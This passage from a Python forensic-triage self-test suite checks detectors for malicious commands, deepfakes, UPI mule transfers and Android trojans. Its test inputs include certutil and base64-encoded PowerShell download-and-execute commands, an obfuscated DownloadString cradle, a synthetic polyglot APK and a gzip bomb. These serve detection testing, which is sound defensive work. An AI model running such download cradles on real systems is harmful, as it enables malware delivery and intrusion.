            f"first line of 8 MB: {peak} B; cap {o.MAX_INMEMORY_BYTES >> 20} MB; one artifact cached"
    check("B-F15 lines are read lazily, one artifact cached at a time, parse cap within the RAM budget", f15)

    def f16():   # gzip bomb
        media = DeepfakeTriageEngine()
        media.MAX_LOG_BYTES = cap = 4 * 1024 * 1024
        raw = gzip.compress(b"A" * (3 * cap), 6)
        parsed, peak = peak_bytes(lambda: media.parse_whatsapp_log(raw))
        return (parsed["errors"] and peak < 3 * cap and DeepfakeTriageEngine.MAX_LOG_BYTES <= 64 * 1024 * 1024), \
            f"peak {peak / cap:.2f}x the decompression cap ({DeepfakeTriageEngine.MAX_LOG_BYTES >> 20} MB)"
    check("B-F16 whatsapp.log.gz bomb: no second copy of the text, 64 MB decompression cap", f16)

    def f17():   # PGM with a zero dimension
        def go():
            try:
                parse_pgm(b"P5\n0 1000000\n255\n")
                return False
            except ValueError:
                return True
        raised, peak = peak_bytes(go)
        return raised and peak < 1024 * 1024, f"rejected, peak {peak >> 10} KB"
    check("B-F17 18-byte PGM declaring 0 x 1,000,000 pixels is rejected before allocating", f17)

    def f18():   # backtracking regexes
        t = time.perf_counter()
        try:
            parse_pgm(b"P5 " + b"# " * 24 + b"x")
        except ValueError:
            pass
        t_pgm = time.perf_counter() - t
        xml = b'<?xml version="1.0"?><packages><!-- ' + b"<package " * 5000 + b' --><package name="a.b" /></packages>'
        t = time.perf_counter()
        pk = AndroidTrojanTriageEngine.parse_packages_xml(xml)
        t_xml = time.perf_counter() - t
        return t_pgm < 0.25 and t_xml < 0.5 and list(pk) == ["a.b"], f"PGM {t_pgm:.3f}s, packages.xml {t_xml:.3f}s"
    check("B-F18 PGM '# # # ...' header and a 45 KB commented packages.xml parse in linear time", f18)

    def f19():   # APK polyglots beyond HEAD_SCAN and concatenated archives
        apk_ = _synthetic_apk()
        names = lambda r: {f_["finding"] for f_ in r["findings"]}  # noqa: E731
        big = AndroidTrojanTriageEngine.analyze_apk_bytes(b"\xff\xd8\xff\xe0" + bytes(5 * 1024 * 1024) + b"\xff\xd9" + apk_)
        pay = io.BytesIO()
        with zipfile.ZipFile(pay, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("payload.dex", b"dex\n035\x00" + bytes(64))
        cat = AndroidTrojanTriageEngine.analyze_apk_bytes(apk_ + pay.getvalue())
        e = apk_.rfind(b"PK\x05\x06")          # same clean APK, central directory listed in reverse order
        cd_size, cd_off = struct.unpack_from("<II", apk_, e + 12)
        cd, ents, p = apk_[cd_off:cd_off + cd_size], [], 0
        while p < len(cd):
            n_, m_, k_ = struct.unpack_from("<HHH", cd, p + 28)
            ents.append(cd[p:p + 46 + n_ + m_ + k_])
            p += 46 + n_ + m_ + k_
        rev = apk_[:cd_off] + b"".join(reversed(ents)) + apk_[cd_off + cd_size:]
        clean = AndroidTrojanTriageEngine.analyze_apk_bytes(rev)
        return ("JPEG_ZIP_POLYGLOT" in names(big) and "CONCATENATED_ZIP" in names(cat) and clean["findings"] == []
                and big["threat_score"] >= 0.85), f"{sorted(names(big))} {sorted(names(cat))}, reordered CD clean"
    check("B-F19 5 MB JPEG prefix and an appended ZIP are flagged; a reordered central directory is not", f19)

    def f20():   # verify_anchor bounds
        data = b"0123456789abcdefghij"
        p = os.path.join(rdir, "anchor.bin")
        with open(p, "wb") as f:
            f.write(data)
        zero = {"byte_offset": 999, "length": 0, "sha256": _sha256_hex(b"")}
        neg = {"byte_offset": -8, "length": 8, "sha256": _sha256_hex(data[-8:])}
        good = {"byte_offset": 2, "length": 5, "sha256": _sha256_hex(data[2:7])}
        got = [V(zero, data), V(zero, p), V(neg, data), V(neg, p), V({"byte_offset": 2}, p), V(good, data), V(good, p)]
        return got == [False] * 5 + [True, True], str(got)
    check("B-F20 verify_anchor rejects zero-length, negative and malformed anchors without raising", f20)

    def f21():   # validate_manifest never raises (B-01: string threat_score)
        m = run_data(ev=("process_events_jsonl", bundle["events"]))
        muts = [lambda d: d["symbolic_anchors"].__setitem__(0, None),
                lambda d: d["symbolic_anchors"][0].__setitem__("symbolic_anchor", None),
                lambda d: d["symbolic_anchors"][0].__setitem__("threat_score", "high"),
                lambda d: d.__setitem__("summary_metrics", 5),
                lambda d: d.__setitem__("triage_timestamp_utc", 0),
                lambda d: d["symbolic_anchors"][0].__setitem__("threat_score", float("nan")),
                lambda d: d.__setitem__("symbolic_anchors", {"a": 1})]
        problems = []
        for mut in muts:
            d = json.loads(json.dumps(m))
            mut(d)
            problems.append(validate_manifest(d))
        return (validate_manifest(m) == [] and all(isinstance(p_, list) and p_ for p_ in problems)), \
            f"{len(problems)} tampered manifests reported, none raised"
    check("B-F21/B-01 validate_manifest reports null leads, string/NaN scores and wrong types", f21)

    def f22():   # Section 45 / Section 39 labels
        c = LogTriageEngine().section45_exculpatory_checklist(
            {"event_id": 1, "timestamp": "2026-10-14T06:00:00Z", "command_line": "x"}, [])
        return ("grounds of opinion" in c["statute"] and "Section 39" in c["statute"] and "expert opinion" not in c["statute"]
                and "Section 45 BSA 2023 expert opinion" not in ADMISSIBILITY_DOCTRINE
                and "Section 39 BSA 2023" in ADMISSIBILITY_DOCTRINE), c["statute"][:60]
    check("B-F22 Section 45 BSA is 'grounds of opinion', expert opinion is Section 39", f22)

    def f23():   # Sec 45 checklist names its lead with an absolute anchor (B-S45-01)
        p = os.path.join(rdir, "s45.img")
        with open(p, "wb") as f:
            f.write(bytes(8192) + bundle["events"])
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, device_owner="rahul")
        o.add_artifact("events", "process_events_jsonl", "SYSMON_EVENT_LOG_JSONL", path=p, base_offset=8192,
                       length=len(bundle["events"]), extent=True)
        m = o.run(write=False)
        s = m["section45_exculpatory_checklist"]
        logs = [l for l in m["symbolic_anchors"] if l["lead_id"].startswith("LEAD-B-LOG")]
        tgt = next((l for l in logs if l["lead_id"] == s.get("evaluated_for_lead_id")), None)
        return (tgt is not None and tgt["threat_score"] == max(l["threat_score"] for l in logs)
                and s["evaluated_for_lead_offset"] == tgt["symbolic_anchor"]["byte_offset"]
                and V(s["evaluated_for_anchor"], p)), f"{s.get('evaluated_for_lead_id')} @ {s.get('evaluated_for_lead_offset')}"
    check("B-F23/B-S45-01 Sec 45 checklist names the screened lead and its absolute anchor", f23)

    def f24():   # STR XML with an XML-illegal control character
        m = run_data(upi=("upi_csv", bundle["upi"].replace(b"mule1@ybl", b"mule1\x0b@ybl")))
        st = lead(m, "RAPID_UPI_SMURFING")["statutory_actions"]
        ET.fromstring(st["fiu_ind_str_xml"])
        clean = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
        return (st["fiu_ind_str_xml_ready"] is False and st.get("fiu_ind_str_xml_problems")
                and clean["fiu_ind_str_xml_ready"] is True), "well-formed, marked not ready with a reason"
    check("B-F24 a control character in a VPA keeps the STR XML well-formed and not 'ready'", f24)

    def f25():   # commented-out <package> cannot take the anchor
        xml = (b'<?xml version="1.0"?>\n<packages>\n<!-- migrated from <package name="com.challan.update" /> -->\n'
               b'<package name="com.challan.update" codePath="/data/app/x" installer="">\n'
               b'  <perms><item name="android.permission.BIND_ACCESSIBILITY_SERVICE" granted="true"/></perms>\n'
               b'</package>\n</packages>\n')
        a = lead(run_data(pk=("packages_xml", xml)), "ANDROID_TROJAN_CAPABILITY")["symbolic_anchor"]
        span = xml[a["byte_offset"]:a["byte_offset"] + a["length"]]
        return (span.startswith(b"<package name") and span.endswith(b"</package>")
                and b"BIND_ACCESSIBILITY_SERVICE" in span), f"anchor @{a['byte_offset']}+{a['length']}"
    check("B-F25 packages.xml anchors come from the parser: a commented <package> is ignored", f25)

    def f26():   # time-indexed smurfing and bridge matching
        t0 = 1792000000.0
        rows = [{"txn_id": f"T{i}", "rrn": "", "epoch": t0 + 60.0 * i, "amount_inr": 100.0 + i % 50,
                 "payer_vpa": f"cust{i}@ybl", "payee_vpa": "shop@ybl", "payee_ifsc": "YESB0000001"} for i in range(5000)]
        fin = FinancialMuleDetector()
        t = time.perf_counter()
        fin.detect_smurfing(rows)
        t_s = time.perf_counter() - t
        chain = [{"tx_hash": f"0x{i}", "epoch": t0 + 600.0 * i, "amount_usdt": 50.0} for i in range(1000)]
        t = time.perf_counter()
        fin.match_bridges(rows[:1000], chain)
        t_b = time.perf_counter() - t
        return t_s < 0.8 and t_b < 0.8, f"5,000 rows {t_s:.3f}s, 1,000 x 1,000 bridges {t_b:.3f}s"
    check("B-F26 smurfing and bridge matching are time-indexed, not O(n^2)", f26)

    def frz():   # B's freeze notice defers to Sector D's
        st = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
        return (st["bnss_sec_106_freeze_ready"] is False and st["bnss_sec_106_fields_complete"] is True
                and "SECTOR_D" in st["freeze_notice"]["notice_status"]), st["freeze_notice"]["notice_status"]
    check("B-FRZ01 B's gross-credit freeze view is marked preliminary and superseded by Sector D", frz)

    def tz():   # device-local offset exported
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, log_utc_offset_minutes=0)
        o.add_artifact("ad", "anydesk_trace", "ANYDESK_CONNECTION_TRACE", data=bundle["anydesk"])
        m = o.run(write=False)
        return m["engine_runtime"].get("log_utc_offset_minutes") == 0, f"engine_runtime {m['engine_runtime'].get('log_utc_offset_minutes')}"
    check("B-TZ01 the device-local log offset is recorded in engine_runtime", tz)

    def stun():   # STUN/TURN entries carry absolute anchors
        off, ln = layout["whatsapp"]
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
        o.add_artifact("whatsapp", "whatsapp_log", "ANDROID_WHATSAPP_LOG", path=image, base_offset=off, length=ln,
                       extent=True)
        m = o.run(write=False)
        sv = lead(m, "WEBRTC_PEER_ENDPOINT")["lead_details"]["stun_turn_servers"]
        return sv and all(s["byte_offset"] >= off and V(s, image) for s in sv), \
            f"{len(sv)} servers @ {sorted({s['byte_offset'] for s in sv})}"
    check("B-STUN01 stun_turn_servers offsets are absolute in the image and re-hash", stun)

    def art():   # artifacts[] are verifiable anchors
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
        for name, kind in (("chat", "chat_transcript"), ("upi", "upi_csv")):
            off, ln = layout[name]
            o.add_artifact(name, kind, "TEST", path=image, base_offset=off, length=ln, extent=True)
        arts = o.run(write=False)["artifacts"]
        return all(a.get("file_path") == image and a.get("offset_basis") == "ABSOLUTE_IN_FILE" and V(a, a["file_path"])
                   for a in arts), f"{sum(1 for a in arts if a.get('file_path'))}/{len(arts)} entries name their file"
    check("B-ART01 artifacts[] entries name their file and offset basis and re-hash", art)

    def strr():  # STR citation matches Sector D
        st = lead(run_data(upi=("upi_csv", bundle["upi"])), "RAPID_UPI_SMURFING")["statutory_actions"]
        statute = ET.fromstring(st["fiu_ind_str_xml"]).find("Statute").text
        return "read with Rule 8," in statute and "Rule 3" not in statute, statute[-60:]
    check("B-STR01 STR summary cites Section 12 PMLA read with Rule 8, as Sector D does", strr)

    def console():   # cp1252 / ascii consoles: what the __main__ entry does before the self-test prints
        res, saved = [], sys.stdout
        try:
            for enc in ("cp1252", "ascii"):
                buf = io.BytesIO()
                sys.stdout = io.TextIOWrapper(buf, encoding=enc)
                _safe_console()
                print("SUTRA-Trace Sector B self-test  \u00b7  \u2192 \u2714 \u20b9 \U0001F600")
                sys.stdout.flush()
                res.append(b"\\u2192" in buf.getvalue())
        finally:
            sys.stdout = saved
        return all(res), "unencodable characters escaped on cp1252 and ascii consoles"
    check("CONSOLE self-test output survives a cp1252 or ascii console", console)
    return out


def _utc_like(epoch: float) -> str:
    """'YYYY-MM-DDTHH:MM:SS' (no zone) for an epoch, without gmtime()."""
    return iso_utc(epoch)[:19]


def _self_test(workdir: str) -> int:
    os.makedirs(workdir, exist_ok=True)
    results: List[Tuple[str, bool]] = []

    def check(name: str, ok: bool, detail: str = "") -> None:
        ok = bool(ok)
        results.append((name, ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] {len(results):02d} {name}" + (f"  ({detail})" if detail else ""))

    print("=" * 78)
    print(f"SUTRA-Trace Sector B self-test  ·  {TRIAGE_VERSION}-{TRIAGE_REVISION}  ·  Python {sys.version.split()[0]}")
    print(f"numpy: {_np is not None}  ·  onnxruntime: {_ort is not None}  ·  "
          f"Sector A: {getattr(_sector_a, 'VAULT_VERSION', 'not found')}")
    print("=" * 78)

    log, media, fin, apk = LogTriageEngine(), DeepfakeTriageEngine(), FinancialMuleDetector(), AndroidTrojanTriageEngine()

    print("\nB.1 Log & command triage")
    r = log.analyze_command("certutil.exe -urlcache -split -f http://185.220.101.5/a.exe a.exe")
    check("certutil -urlcache -split -f scores >= 0.85 with T1105",
          r["threat_score"] >= 0.85 and r["primary_mitre"].startswith("T1105"),
          f"{r['threat_score']}, {r['primary_mitre']}")
    enc = base64.b64encode(b"IEX (New-Object Net.WebClient).DownloadString('http://x/s.ps1')").decode()
    r = log.analyze_command(f"powershell.exe -enc {enc}")
    check("Base64 -enc payload unpacked and inspected",
          any("downloadstring" in l["text"].lower() for l in r["deobfuscation_layers"][1:])
          and any(i["indicator"] == "PS_DOWNLOADSTRING" for i in r["indicators"]), r["deobfuscation_layers"][-1]["encoding"])
    r = log.analyze_command("powershell -NoP -e " + _ps_enc("Invoke-Expression (Get-Content C:\\t\\x.txt)"))
    check("UTF-16LE Base64 PowerShell payload decoded",
          any(l["encoding"] == "utf-16-le" and "invoke-expression" in l["text"].lower() for l in r["deobfuscation_layers"]))
    packed = base64.b64encode(hashlib.sha512(b"sutra").digest() + hashlib.sha512(b"trace").digest()).decode()
    h = shannon_entropy(packed)
    r = log.analyze_command(f"rundll32.exe {packed}")
    check("High-entropy packed token detected (H >= 4.8)",
          h >= 4.8 and any(i["indicator"] == "SUSPICIOUS_HIGH_ENTROPY_PACKING" for i in r["indicators"]), f"H={h:.3f}")
    r = log.analyze_command("powershell.exe (New-Object Net.WebClient).('down'+'load'+'string')('http://x/p')")
    check("'down'+'load'+'string' flattened before signature check",
          any(i["indicator"] == "PS_DOWNLOADSTRING" for i in r["indicators"])
          and any(l["stage"] == "flattened" and "downloadstring" in l["text"].lower() for l in r["deobfuscation_layers"]))
    r = log.analyze_command("powershell.exe -NoProfile Get-Date", parent_image="C:\\Office16\\WINWORD.EXE")
    check("winword.exe -> powershell.exe adds penalty >= 0.20", r["parent_child_penalty"] >= 0.20,
          f"penalty {r['parent_child_penalty']}")
    r = log.analyze_command("cmd.exe /c whoami", parent_image="C:\\Program Files\\Google\\Chrome\\chrome.exe")
    check("chrome.exe -> cmd.exe flagged", any(i["indicator"] == "BROWSER_SPAWNED_CLI" for i in r["indicators"]),
          f"score {r['threat_score']}")
    r = log.analyze_command("\"C:\\Windows\\explorer.exe\" C:\\Users\\rahul\\Documents\\Quarterly_Report_2026_final.docx",
                            parent_image="userinit.exe")
    check("Benign explorer.exe command scores < 0.30", r["threat_score"] < 0.30, f"score {r['threat_score']}")
    events = [{"event_id": 4624, "timestamp": "2026-10-14T05:00:00Z", "logon_type": 2, "user": "rahul"}]
    tgt_i = {"event_id": 1, "timestamp": "2026-10-14T06:00:00Z", "logon_type": 2, "user": "rahul",
             "command_line": "certutil -urlcache -split -f http://x/a a", "parent_image": "explorer.exe"}
    tgt_s = dict(tgt_i, logon_type=5, parent_image="services.exe")
    ci = log.section45_exculpatory_checklist(tgt_i, events, device_owner="rahul")
    cs = log.section45_exculpatory_checklist(tgt_s, events + [{"event_id": 7045, "timestamp": "2026-10-14T05:30:00Z"}],
                                             device_owner="rahul")
    check("Sec 45 BSA checklist separates interactive from service logon",
          ci["session_class"] == "INTERACTIVE_CONSOLE" and cs["session_class"] == "SERVICE"
          and ci["checks_evaluated"] == 14 and ci["checks"][0]["result"] == "SUPPORTS_ATTRIBUTION"
          and cs["checks"][0]["result"] == "SUPPORTS_INTRUSION_HYPOTHESIS"
          and ci["trojan_defense_probability"] < cs["trojan_defense_probability"],
          f"trojan-defence ratio {ci['trojan_defense_probability']} vs {cs['trojan_defense_probability']}")

    print("\nB.2 Synthetic media & deepfake triage")
    jaw, fore, red = _synthetic_rppg(0.025)
    real = media.analyze_rppg(jaw, fore, 30.0, red)
    check("Authentic face: PTT phase lag in [0.09, 0.34] rad",
          real["verdict"] == "AUTHENTIC_PHYSIOLOGICAL_PTT" and 0.09 <= real["ptt_phase_delta_rad"] <= 0.34,
          f"{real['ptt_phase_delta_rad']} rad, {real['ptt_delay_ms']} ms at {real['heart_rate_bpm']} bpm")
    jaw, fore, red = _synthetic_rppg(0.0)
    fake = media.analyze_rppg(jaw, fore, 30.0, red)
    check("Global shader injection flagged SYNTHETIC_RPPG_SHADER_INJECTION",
          fake["verdict"] == "SYNTHETIC_RPPG_SHADER_INJECTION" and fake["threat_score"] == 0.96,
          f"{fake['ptt_phase_delta_rad']} rad")
    nat = media.analyze_spectrum(_synthetic_image(0.0), qp=28)
    syn = media.analyze_spectrum(_synthetic_image(6.0), qp=28)
    check("2D-DCT detects Nyquist checkerboard in synthetic image",
          syn["verdict"] == "GENERATIVE_UPSAMPLER_CHECKERBOARD" and nat["verdict"] == "NATURAL_SPECTRAL_DECAY",
          f"Nyquist peak excess {nat['nyquist_peak_excess_ratio']} vs {syn['nyquist_peak_excess_ratio']}, alpha {nat['spectral_alpha']}")
    mid = _synthetic_image(2.0)
    lo_q, hi_q = media.analyze_spectrum(mid, qp=30), media.analyze_spectrum(mid, qp=46)
    check("QP-gated compensation relaxes HF threshold at high QP",
          media.qp_relaxation(46) == 1.5 and media.qp_relaxation(30) == 1.0
          and lo_q["verdict"] != hi_q["verdict"] and hi_q["verdict"] == "NATURAL_SPECTRAL_DECAY",
          f"peak excess {lo_q['nyquist_peak_excess_ratio']}, thresholds {lo_q['nyquist_peak_threshold_applied']} / {hi_q['nyquist_peak_threshold_applied']}")
    check("Dicrotic notch 2nd-harmonic ratio within [0.15, 0.48]",
          real["dicrotic_in_range"] and 0.15 <= real["dicrotic_harmonic_ratio"] <= 0.48 and real["chroma_in_range"],
          f"E2/E1 {real['dicrotic_harmonic_ratio']}, G/R {real['green_red_chroma_ratio']}")
    bundle = _build_case_bundle()
    wa = media.parse_whatsapp_log(gzip.compress(bundle["whatsapp"]))
    targets = media.requisition_targets(wa)
    check("whatsapp.log(.gz): STUN/TURN servers and srflx IP:port extracted",
          len(targets) == 1 and targets[0]["ip"] == "185.220.101.5" and targets[0]["port"] == 3478
          and {s["scheme"] for s in wa["stun_turn_servers"]} == {"stun", "turn"},
          f"{len(wa['candidates'])} candidates")
    req = media.build_sec94_requisition("FIR-042/2026-CYBER", targets[0])
    check("Sec 94 BNSS IPDR requisition carries srflx IP and UTC time",
          req["target_public_ip"] == "185.220.101.5" and req["observed_timestamp_utc"] == "2026-10-14T06:10:02.912Z"
          and "Section 94" in req["statute"] and req["query_window_utc"][0] == "2026-10-14T06:05:02.912Z")
    vc = media.scan_registry_export(bundle["registry"])
    check("Seized rig: OBS Virtual Camera registry instance flagged",
          len(vc) == 1 and vc[0]["friendly_name"] == "OBS Virtual Camera" and vc[0]["video_input_device_category"]
          and bundle["registry"][vc[0]["byte_offset"]:vc[0]["byte_offset"] + 2] == "[".encode("utf-16-le"))
    ad = media.parse_anydesk_trace(bundle["anydesk"])
    check("AnyDesk connection_trace: 9-digit ID and direction parsed",
          ad[0]["remote_client_id"] == "482193765" and ad[0]["direction"] == "INCOMING" and ad[1]["direction"] == "OUTGOING")

    print("\nB.3 Financial mule network")
    v = fin.validate_rrn("628706123456")
    check("Valid NPCI RRN Y-DDD-HH-STAN accepted",
          v["valid"] and v["decoded"]["julian_day"] == 287 and v["decoded"]["hour"] == 6
          and v["decoded"]["inferred_date"] == "2026-10-14", str(v["decoded"]))
    bad_day, bad_hour = fin.validate_rrn("640006123456"), fin.validate_rrn("628725123456")
    check("Synthetic RRN (day 400 / hour 25) rejected",
          not bad_day["valid"] and not bad_hour["valid"] and not fin.validate_rrn("62870612345")["valid"],
          f"{bad_day['reasons'][0]}; {bad_hour['reasons'][0]}")

    def txn(i, sec, payer, payee, amt):
        return {"txn_id": f"X{i}", "rrn": f"6287060001{i:02d}", "epoch": 1792000000 + sec,
                "timestamp_utc": iso_utc(1792000000 + sec), "payer_vpa": payer, "payee_vpa": payee,
                "amount_inr": amt, "payee_ifsc": "YESB0000001"}

    fan = [txn(0, 0, "victim@okhdfc", "hub@ybl", 200000), txn(1, 15, "hub@ybl", "m1@ybl", 49000),
           txn(2, 35, "hub@ybl", "m2@paytm", 49000), txn(3, 60, "hub@ybl", "m3@okaxis", 49000),
           txn(4, 80, "hub@ybl", "m4@ibl", 49000)]
    a = fin.detect_smurfing(fan)
    check("Rapid fan-out: 1 inflow -> 4 outflows in 80 s (ratio 0.98) flagged",
          len(a) == 1 and a[0]["dispersion_ratio"] == 0.98 and len(a[0]["flagged_mules"]) == 4,
          f"score {a[0]['threat_score'] if a else None}")
    late = fan[:3] + [txn(3, 320, "hub@ybl", "m3@okaxis", 49000), txn(4, 340, "hub@ybl", "m4@ibl", 49000)]
    check("Outflows after 300 s not grouped into the 180 s cluster", fin.detect_smurfing(late) == [])
    thin = [fan[0]] + [dict(t, amount_inr=10000) for t in fan[1:]]
    check("Dispersion ratio 0.20 does not trigger smurfing", fin.detect_smurfing(thin) == [])
    toks = fin.extract_hawala_tokens(bundle["chat"])
    check("Mirror-hawala: note serial token extracted",
          [t["normalized"] for t in toks] == ["34K712946"] and fin.is_note_serial("34K 712946")
          and fin.is_note_serial("34K712946"), toks[0]["context"][:48] if toks else "")
    check("Hawala regex rejects malformed serials",
          not any(fin.is_note_serial(s) for s in ("3K712946", "34KK712946", "34K71294", "34K7129461", "34k712946",
                                                  "AB1234567")))
    upi_u = {"rrn": "628706000107", "epoch": 1792000000.0, "amount_inr": 95000.0}
    usdt = round(95000.0 / (84.0 * 1.05), 2)
    good = fin.match_bridges([upi_u], [{"tx_hash": "0xa", "epoch": 1792000120.0, "amount_usdt": usdt}])
    check("Bridge: UPI RRN matched to USDT within 300 s and premium window",
          len(good) == 1 and good[0]["rate_window_ok"] and good[0]["upi"]["rrn"] == "628706000107",
          f"affinity {good[0]['affinity'] if good else None}, premium {good[0]['p2p_premium'] if good else None}")
    far = fin.match_bridges([upi_u], [{"tx_hash": "0xb", "epoch": 1792000600.0, "amount_usdt": usdt}])
    check("Bridge rejected when dt = 600 s exceeds tau_escrow", far == [],
          f"affinity {fin.bridge_affinity(upi_u, {'epoch': 1792000600.0, 'amount_usdt': usdt})['affinity']}")
    notice = fin.build_freeze_notice("FIR-042/2026-CYBER", a[0])
    check("Sec 106 BNSS / 1930 freeze notice has all required fields",
          notice["fields_complete"] and len(notice["freeze_entries"]) == 4 and "Section 106" in notice["statute"]
          and all(e["beneficiary_ifsc"] and e["npci_rrn"] and e["amount_inr"] for e in notice["freeze_entries"]))
    xml = ET.fromstring(fin.build_fiu_str_xml("FIR-042/2026-CYBER", a[0]))
    check("FIU-IND FINnet 2.0 STR XML block well-formed with required tags",
          xml.tag == "STRSummary" and xml.find("CaseReference").text == "FIR-042/2026-CYBER"
          and len(xml.findall("./Transactions/Transaction")) == 5 and len(xml.findall("./SuspectAccounts/Account")) == 5
          and xml.find("Statute").text.startswith("Section 12"))

    print("\nB.4 Android trojan triage")
    _, secs = apk.split_bugreport(bundle["bugreport"])
    s, e = secs["package"]
    pkgs = apk.parse_dumpsys_package(bundle["bugreport"][s:e])
    secure = apk.parse_secure_settings(bundle["bugreport"][slice(*secs["settings"])])
    scored = {p["package"]: p for p in apk.score_packages(pkgs, secure)}
    ch = scored.get("com.challan.update", {})
    check("Sideloaded package with BIND_ACCESSIBILITY_SERVICE flagged",
          "BIND_ACCESSIBILITY_SERVICE" in ch.get("dangerous_capabilities", []) and ch["sideloaded"]
          and ch["threat_score"] >= 0.9 and "ACCESSIBILITY_ENABLED" in ch["enabled_in_secure_settings"],
          f"score {ch.get('threat_score')}")
    ot = scored.get("com.sms.otp.helper", {})
    wa_pkg = scored.get("com.whatsapp", {"threat_score": 0})
    check("Package with BIND_NOTIFICATION_LISTENER_SERVICE flagged",
          "BIND_NOTIFICATION_LISTENER_SERVICE" in ot.get("dangerous_capabilities", []) and ot["threat_score"] >= 0.85
          and wa_pkg["threat_score"] < LEAD_THRESHOLD, f"score {ot.get('threat_score')}, Play-store app {wa_pkg['threat_score']}")
    evs = apk.parse_usagestats(bundle["bugreport"][slice(*secs["usagestats"])])
    ov = apk.detect_overlay_attacks(evs, {"com.challan.update"})
    check("Overlay: rogue MOVE_TO_FOREGROUND 200 ms after banking app flagged",
          len(ov) == 1 and ov[0]["overlay_package"] == "com.challan.update" and ov[0]["delta_ms"] == 200.0)
    poly = apk.analyze_apk_bytes(bundle["apk"])
    clean = apk.analyze_apk_bytes(_synthetic_apk())
    names = {f["finding"] for f in poly["findings"]}
    check("Polyglot APK: JPEG FF D8 FF before ZIP (and trailer DEX) detected",
          "JPEG_ZIP_POLYGLOT" in names and "HIDDEN_DEX_IN_TRAILER_SLACK" in names and clean["findings"] == [],
          ", ".join(sorted(names)))

    print("\nOrchestrator (end-to-end over a Sector A vaulted case bundle)")
    image = os.path.join(workdir, "case_bundle.img")
    layout, pos, blob = {}, 0, bytearray()
    for name, data in bundle.items():
        pos = (pos + 4095) // 4096 * 4096
        blob.extend(bytes(pos - len(blob)))
        layout[name] = (pos, len(data))
        blob.extend(data)
        pos += len(data)
    blob.extend(bytes((-len(blob)) % 4096))
    with open(image, "wb") as f:
        f.write(blob)
    a_manifest = None
    if _sector_a is not None:
        vault = _sector_a.SutraEvidenceVault(case_id="FIR-042/2026-CYBER", output_dir=os.path.join(workdir, "sector_a"))
        a_manifest = vault.ingest_evidence(image)
    orch = SutraNeuralTriageOrchestrator("FIR-042/2026-CYBER", output_dir=workdir, device_owner="rahul")
    if a_manifest is not None:
        orch.bind_sector_a_manifest(os.path.join(workdir, "sector_a", SECTOR_A_MANIFEST))
    kinds = {"events": ("process_events_jsonl", "SYSMON_EVENT_LOG_JSONL"),
             "whatsapp": ("whatsapp_log", "ANDROID_WHATSAPP_LOG"),
             "rppg": ("rppg_trace", "VIDEO_CALL_ROI_TRACE"),
             "registry": ("registry_export", "WINDOWS_REGISTRY_EXPORT"),
             "anydesk": ("anydesk_trace", "ANYDESK_CONNECTION_TRACE"),
             "upi": ("upi_csv", "UPI_TRANSACTION_EXPORT"),
             "chain": ("chain_csv", "BLOCKCHAIN_TRANSFER_EXPORT"),
             "chat": ("chat_transcript", "CHAT_TRANSCRIPT_TEXT"),
             "bugreport": ("bugreport", "ANDROID_BUGREPORT"),
             "apk": ("apk", "ANDROID_APK_FILE")}
    for name, (kind, stype) in kinds.items():
        off, ln = layout[name]
        orch.add_artifact(name, kind, stype, path=image, base_offset=off, length=ln, extent=True,
                          display_path="case_bundle.img")
    t0 = time.perf_counter()
    m = orch.run(triage_time_utc="2026-10-20T14:30:00.000Z")
    elapsed = time.perf_counter() - t0
    leads = m["symbolic_anchors"]
    all_verified = all(SutraNeuralTriageOrchestrator.verify_anchor(l["symbolic_anchor"], image) for l in leads)
    tamper = dict(leads[0]["symbolic_anchor"], byte_offset=leads[0]["symbolic_anchor"]["byte_offset"] + 1)
    check("Symbolic anchor P_sym on every lead re-hashes from the vaulted image",
          leads and all_verified and not SutraNeuralTriageOrchestrator.verify_anchor(tamper, image),
          f"{len(leads)} leads, all anchors verified, shifted anchor rejected")
    with open(os.path.join(workdir, MANIFEST_FILENAME), "r", encoding="utf-8") as f:
        on_disk = json.load(f)
    cats = {l["threat_category"] for l in leads}
    need = {"LOLBINS_COMMAND", "DIGITAL_ARREST_DEEPFAKE", "WEBRTC_PEER_ENDPOINT", "VIRTUAL_CAMERA_INJECTOR",
            "RAPID_UPI_SMURFING", "CROSS_CHAIN_BRIDGE", "MIRROR_HAWALA_TOKEN", "ANDROID_TROJAN_CAPABILITY",
            "OVERLAY_HIJACK", "POLYGLOT_APK"}
    deep = next((l for l in leads if l["threat_category"] == "DIGITAL_ARREST_DEEPFAKE"), {})
    smurf = next((l for l in leads if l["threat_category"] == "RAPID_UPI_SMURFING"), {})
    bound = (a_manifest is None or (m["sector_a_binding"]["sha256_linear_primary"] == _sha256_hex(bytes(blob))))
    check("Orchestrator emits canonical triage_manifest.json conforming to schema",
          validate_manifest(on_disk) == [] and on_disk == m and need <= cats and bound
          and deep.get("statutory_actions", {}).get("target_ip") == "185.220.101.5"
          and set(smurf.get("statutory_actions", {}).get("flagged_mules", [])) >= {"mule1@ybl", "mule2@paytm"}
          and m["summary_metrics"]["exculpatory_checks_evaluated"] == 14 and m["artifact_errors"] == [],
          f"{len(leads)} leads ({m['summary_metrics']['high_priority_leads_flagged']} high/critical), "
          f"{m['summary_metrics']['total_telemetry_events_scanned']} events, {elapsed:.2f}s, "
          f"Sector A {'bound' if a_manifest else 'not found'}")

    print("\nLeads")
    for l in leads:
        a_ = l["symbolic_anchor"]
        print(f"  {l['lead_id']:<18} {l['severity']:<8} {l['threat_score']:.2f}  {l['threat_category']:<26} "
              f"@{a_['byte_offset']}+{a_['length']}  {a_['sha256'][:16]}")
    print(f"\nManifest: {os.path.join(workdir, MANIFEST_FILENAME)}")
    regressions = _audit_regressions(workdir)
    passed = sum(ok for _, ok in results)
    reg_passed = sum(ok for _, ok in regressions)
    print(f"\n{reg_passed}/{len(regressions)} audit regression checks passed")
    print(f"{passed}/{len(results)} checks passed")
    overnight = _overnight_regressions(workdir, image, layout,
                                       os.path.join(workdir, "sector_a", SECTOR_A_MANIFEST) if a_manifest else None)
    ov_passed = sum(ok for _, ok in overnight)
    print(f"\n{ov_passed}/{len(overnight)} overnight audit regression checks passed")
